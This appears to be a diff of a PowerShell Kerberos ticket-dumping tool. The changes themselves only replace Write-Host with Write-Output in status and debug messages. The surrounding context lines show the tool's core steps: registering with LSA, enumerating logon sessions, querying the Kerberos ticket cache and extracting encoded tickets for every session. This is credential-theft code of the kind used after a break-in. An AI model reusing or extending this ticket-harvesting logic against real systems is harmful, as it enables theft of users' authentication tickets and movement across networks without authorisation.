@@ -71,7 +71,7 @@ Function LsaRegisterLogonProcess()
 
        [int]$ret = [ticket.dump]::LsaRegisterLogonProcess($LSAString,[ref]$lsah,[ref]$SecurityMode)
        if ($ret -ne 0){
-        write-host "[-] Error in LsaRegisterLogonProcess. Using LsaConnectUntrusted: ", $ret
+        Write-Output "[-] Error in LsaRegisterLogonProcess. Using LsaConnectUntrusted: ", $ret
         $DumpAllTkt = $false
         return $(LsaConnectUntrusted)
        }
@@ -206,7 +206,7 @@ Function ExtractTicket([intptr]$lsaHandle,[int]$authPackage,[ticket.dump+LUID]$l
     [ticket.dump]::LsaFreeReturnBuffer($responsePointer)
     [System.Runtime.InteropServices.Marshal]::FreeHGlobal($unmanagedAddr)
     # DEBUG PURPOSES
-    #write-host "B64: ", $([Convert]::ToBase64String($encodedTicket))
+    #Write-Output "B64: ", $([Convert]::ToBase64String($encodedTicket))
     $ticketobj = New-Object psobject
     $ticketobj | Add-Member -Type NoteProperty -Name "success" -Value $true
     try {
@@ -235,7 +235,7 @@ Function EnumerateLogonSessions()
            $count = New-Object System.Int32
            $luidptr = New-Object System.IntPtr 
            $ret = [ticket.dump]::LsaEnumerateLogonSessions([ref]$count,[ref]$luidptr)
-           if($ret -ne 0){Write-Host "[-] Cant enum logon sessions: ", $ret}
+           if($ret -ne 0){Write-Output "[-] Cant enum logon sessions: ", $ret}
            else
            {
                 $Luidtype = New-Object ticket.dump+LUID
@@ -618,7 +618,7 @@ function main{
         if ($([System.Convert]::ToString($luid.LowPart,16) -eq 0x0)){
            continue;
         } else{
-            #write-host "    [?] LUID: 0x$([System.Convert]::ToString($luid.HighPart,16) )$([System.Convert]::ToString($luid.LowPart,16))"
+            #Write-Output "    [?] LUID: 0x$([System.Convert]::ToString($luid.HighPart,16) )$([System.Convert]::ToString($luid.LowPart,16))"
             $logonSessionData = New-Object ticket.dump+LogonSessionData
             try {
                 $logonSessionData = GetLogonSessionData($luid)
@@ -648,7 +648,7 @@ function main{
             $retcode = [ticket.dump]::LsaCallAuthenticationPackage($lsah,$authpckg,$tQueryPtr,[System.Runtime.InteropServices.Marshal]::SizeOf($ticketCacheRequest),[ref]$ticketsPointer,[ref]$returnBufferLength,[ref]$protocolStatus)
             if(($retcode -eq 0) -and ($ticketsPointer -ne [System.IntPtr]::Zero))
             {    
-            #write-host "   [+] Calling AP Kerberos success"
+            #Write-Output "   [+] Calling AP Kerberos success"
             [ticket.dump+KERB_QUERY_TKT_CACHE_RESPONSE]$ticketCacheRespone = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ticketsPointer,[type]$ticketCacheResponeType)
             $count2 = $ticketCacheRespone.CountOfTickets
             if($count2 -ne 0)
@@ -684,7 +684,7 @@ function main{
                     catch{}
 
                     } else {
-                        #write-host "    [-] Cant recover TKT. May be outdated"
+                        #Write-Output "    [-] Cant recover TKT. May be outdated"
                     }
                     $sessioncred += $ticket
                 }
